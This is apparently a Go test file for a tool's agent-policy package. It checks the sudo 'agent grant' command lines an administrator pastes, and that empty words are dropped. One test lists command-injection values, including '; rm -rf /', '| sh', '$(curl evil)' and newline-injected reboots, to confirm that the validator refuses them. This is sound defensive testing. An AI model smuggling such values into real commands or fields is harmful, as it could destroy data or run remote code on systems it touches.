package agentpolicy

import (
	"testing"

	"github.com/ldesfontaine/kagu/internal/kit/brand"
)

func TestGrantLine_WritesTheLineRootPastes(t *testing.T) {
	cases := []struct{ right, value, want string }{
		{CapabilityDockerDeploy, "", "sudo " + brand.Command + " agent grant docker.deploy"},
		{CapabilityFilesWrite, "/srv/restore", "sudo " + brand.Command + " agent grant files.write=/srv/restore"},
	}
	for _, c := range cases {
		if got := GrantLine(c.right, c.value); got != c.want {
			t.Errorf("GrantLine(%q, %q) = %q, want %q", c.right, c.value, got, c.want)
		}
	}
}

// R-A3-15 (N-M3) : une ligne que l'interface montre ne porte jamais
// d'enchaînement ; une valeur hostile donne un refus sans ligne.
func TestR_A3_15_AHostileValueGivesARefusalWithoutLine(t *testing.T) {
	hostile := []string{
		"/srv; rm -rf /",
		"/srv | sh",
		"/srv && reboot",
		"/srv $(curl evil)",
		"/srv\nreboot",
		"/srv\rreboot",
		"/srv || true",
	}
	for _, value := range hostile {
		if line := GrantLine(CapabilityFilesWrite, value); line != "" {
			t.Errorf("GrantLine(files.write, %q) = %q, want no line", value, line)
		}
	}
	if line := AgentLine("trust", "add", "server-key", "abc;reboot"); line != "" {
		t.Errorf("AgentLine with a hostile word = %q, want no line", line)
	}
}

func TestAgentLine_DropsEmptyWords(t *testing.T) {
	if got, want := AgentLine("trust", "list", "", ""), "sudo "+brand.Command+" agent trust list"; got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}
